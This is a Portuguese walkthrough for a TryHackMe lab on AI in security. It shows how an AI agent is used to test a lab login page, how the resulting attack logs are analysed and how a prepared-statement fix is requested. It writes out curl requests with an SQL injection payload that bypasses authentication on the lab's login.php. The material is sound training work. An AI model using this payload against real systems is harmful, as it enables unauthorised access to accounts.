# Dia 4 - AI in Security: old sAInt nick

Este guia acompanha [AI in Security - old sAInt nick](https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB). Inicie a Lab Machine. Abra o Van SolveIT em `http://<IP_DA_LAB_MACHINE>/` usando a AttackBox ou seu navegador conectado à VPN. O aplicativo vulnerável do exercício responde na porta 5000.

## Percorrer as etapas do Van SolveIT

Conclua a introdução no agente. Na etapa de Red Team, peça que ele identifique o fluxo de autenticação e proponha um teste para a aplicação fornecida. A entrada `username` do `login.php` é o ponto de teste. Uma requisição de controle com usuário e senha comuns deve falhar; a comparação com uma entrada que altera a condição SQL evidencia a falha:

```bash
export IP='10.x.x.x'  # troque pelo IP da Lab Machine
curl -i -s -X POST "http://$IP:5000/login.php" \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=admin'

curl -i -s -X POST "http://$IP:5000/login.php" \
  --data-urlencode "username=admin' OR 1=1-- -" \
  --data-urlencode 'password=x'
```

Compare o `Location` ou a URL final das duas respostas. A entrada de teste leva ao `dashboard.php`; leia a página e localize a flag do exercício. Submeta-a no campo correspondente.

O [script de comparação do login](scripts/dia04-testar-login.py) automatiza apenas essas duas requisições e mostra a página resultante quando a entrada de teste alcança o dashboard:

```bash
python3 scripts/dia04-testar-login.py --ip 10.x.x.x
```

Resposta 2: `THM{...}`

Na etapa de Blue Team, peça ao agente que analise os registros do ataque que acabou de ocorrer. Observe como ele liga o padrão de requisições ao `login.php`. Na etapa de desenvolvimento seguro, peça uma correção para a consulta SQL: parâmetros preparados e verificação de autorização impedem que texto do usuário vire parte da instrução SQL. Use os controles **Complete Stage** para avançar até o encerramento do showcase e leia a flag exibida pelo aplicativo.

Resposta 1: `THM{...}`
